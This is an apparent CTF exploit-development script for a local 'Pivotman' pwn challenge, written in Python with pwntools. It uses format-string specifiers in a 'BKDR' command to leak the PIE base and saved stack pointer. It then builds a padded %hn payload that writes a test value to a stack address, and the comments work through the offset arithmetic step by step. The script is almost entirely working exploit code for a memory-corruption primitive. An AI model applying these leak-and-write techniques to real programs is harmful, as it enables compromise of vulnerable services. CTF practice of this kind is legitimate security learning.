#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

CHALL_DIR = '/home/gluppler/Downloads/CTFs-Testing/Pwn/Easy/Pivotman/pwn_pivotman/challenge'
ELF_PATH = f'{CHALL_DIR}/chall'
LD_PATH = f'{CHALL_DIR}/ld-linux-x86-64.so.2'
LIBC_PATH = f'{CHALL_DIR}/libc.so.6'

libc = ELF(LIBC_PATH, checksec=False)

p = process([LD_PATH, ELF_PATH], cwd=CHALL_DIR)
p.recvuntil(b' \r\n', timeout=10)
p.sendline(b'USER ;)')
p.recvuntil(b' \r\n')
p.sendline(b'PASS ;)')
p.recvuntil(b' \r\n')

# Get leaks
p.sendline(b'BKDR %2737$p.%2736$p')
resp = p.recvuntil(b' \r\n')
marker = b' BKDR '
idx = resp.find(marker)
after = resp[idx + len(marker):]
parts = after.split(b'.')
pie_base = int(parts[0], 16) - 0x3a10
saved_rbp = int(parts[1], 16)

# Test: write a simple value to a stack address we know is writable
# saved_rbp is in main's stack frame - we know it's writable
# Write 0x4141 to [saved_rbp] to verify write works

target = saved_rbp  # main's saved rbp on stack
write_val = 0x4141  # simple test pattern

# Build a minimal format string to write 2 bytes
# We need: fmt_spec + padding + address

# The address is at buffer position calculated from input length
# Input: BKDR (5) + fmt_spec + padding + p64(target)
# fmt_spec for write: %Xc%Y$hn where X is chars to print and Y is position

# Estimate: fmt is ~15 bytes, padding to align
# With 5 + 15 + pad = 20+ bytes, addr at buffer offset 3+5+15+pad
# Approx addr position = 1030 + (8+15+pad)/8

# Simple test: send a payload where we explicitly know positions
fmt = b'%16705c%1037$hn'  # print 16705 chars, write to pos 1037

# Pad so addr is at position 1037 (= buffer offset 56)
# Current total fmt = 15 bytes
# After "BKDR " (5 bytes), we have 15 bytes of fmt
# Total = 5 + 15 = 20 bytes
# Addr needs to be at buffer offset = 8 + 20 - 5 = 23? 
# Wait: buffer offset = 3 (for "%d ") + 5 (for "BKDR ") + 15 (for fmt) + padding

# Buffer offset of addr: need it to be 56 (since 1030 + 56/8 = 1037)
# 3 + 5 + 15 + pad = 56 → pad = 56 - 23 = 33 bytes
# But 56 % 8 = 0, and 3 + 5 + 15 = 23, 23 % 8 = 7, so padding = 56 - 23 = 33? 
# That's not aligned on 8. Let me reconsider.

# Position 1037 = buffer[56:64]. So addr must start at buffer[56].
# Buffer[56] = input[53] (since input starts at buffer[3]).
# My input = "BKDR " (5) + fmt (15) + padding (Y) + addr (8)
# Total input = 5 + 15 + Y + 8 = 28 + Y
# addr starts at input[20 + Y]
# buffer[3 + 20 + Y] = buffer[23 + Y]
# 23 + Y = 56 → Y = 33
# So padding = 33 bytes.
# But then input[20+Y] = input[53] is not 8-byte aligned (53 % 8 = 5)
# That means the address crosses a position boundary!

# Let me recalculate: I need buffer[56] = start of addr.
# 56 must be a multiple of 8 for clean alignment. 56 = 7 * 8. ✓
# addr starts at buffer[56] = input[53].
# But input[53] is not beginning of an 8-byte position in input space.
# The positions in format string arg space are aligned to 8 bytes FROM buffer[0].
# Position 1037 = buffer[56:64]. This is ALWAYS 8-byte aligned (56 % 8 = 0).
# addr1 is at buffer[56:64], which maps to position 1037. That's fine.
# The addr bytes just happen to be at buffer[56], regardless of input alignment.

# So just pad the input so addr starts at the right buffer offset.
# Let me compute: buffer[56] = input[53] (since buffer[3:] = input[0:])
# input = "BKDR " (5) + fmt (15) + padding (Y) + addr (8)
# input[20+Y] = input[53] → Y = 33
# But input[20+Y] = the start of addr in my input string
# 20 + Y = 53 → Y = 33

# Total input length = 5 + 15 + 33 + 8 = 61 bytes
# input[53:] = addr[0:8]

# Hmm but the fmt string uses %1037$hn. Let me verify:
# buffer[56] = start of p64(target) → first 8 bytes of addr.
# The VALUE at position 1037 is the 8 bytes at buffer[56:64] = p64(target).
# Since we pack the address in little-endian, this value is `target`.
# %1037$hn writes a short (2 bytes) to [target].
# So it should write 0x4141 to [saved_rbp].

# Let me just send this test
padding_len = 33
payload = b'BKDR ' + fmt + b'.' * padding_len + p64(target)
log.info(f'Payload: {len(payload)} bytes')
log.info(f'Target: {hex(target)}, write_val: {hex(write_val)}')

p.sendline(payload)

# Try to get response (may be large)
try:
    resp = p.recv(timeout=5)
    log.info(f'Response: {len(resp)} bytes')
    # Check if program still alive
    p.sendline(b'BKDR %2737$p')
    resp2 = p.recvuntil(b' \r\n', timeout=3)
    log.info(f'Still alive! Response: {resp2[:100]}')
except EOFError:
    log.error('Crashed')
except:
    log.warning('Timeout')

p.close()
